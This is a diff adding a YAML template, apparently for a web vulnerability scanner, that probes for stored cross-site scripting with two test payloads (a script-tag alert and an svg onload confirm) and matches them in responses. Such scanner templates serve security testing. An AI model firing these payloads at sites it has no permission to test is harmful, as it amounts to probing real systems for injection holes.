@@ -1,0 +1,30 @@
+template:
+   name: xss-stored
+   severity: high
+   author: zoidsec
+   description: Stored Based Cross-Site Scripting
+
+request:
+   payloads: 
+      - '"><script>alert(1)</script>'
+      - '<svg%20onx=()%20onload=(confirm)(123)>'
+
+   paths: false
+   exclude: 
+      - .png
+      - .svg
+      - .tiff
+      - .woff
+      - .woff2
+      - .js
+      - .jpg
+      - .gif
+      - .css
+response:
+   statusCode: 200
+   patterns: 
+      - '"><script>alert(1)</script>'
+      - '<svg onx=() onload=(confirm)(123)>'
+   header:
+      - text/json
+      - application/json
